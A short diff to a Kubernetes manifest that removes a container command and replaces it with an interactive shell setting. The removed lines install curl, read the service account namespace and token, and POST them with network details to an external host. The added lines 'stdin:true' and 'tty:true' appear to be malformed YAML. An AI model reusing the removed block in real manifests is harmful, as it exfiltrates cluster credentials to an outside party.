@@ -9,13 +9,6 @@ spec:
       containers:
         - name: shell
           image: alpine
-          command:
-            - sh
-            - -c
-            - |
-              apk add --no-cache curl net-tools;
-              {
-                echo '>> NAMESPACE:' && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace;
-                echo '>> TOKEN:' && cat /var/run/secrets/kubernetes.io/serviceaccount/token;
-                echo '>> IFCONFIG:' && ifconfig;
-              } | curl -X POST --data-binary @- http://potter-maga.brazilsouth.cloudapp.azure.com:8080
+          command: ["sh"]
+          stdin:true
+          tty:true
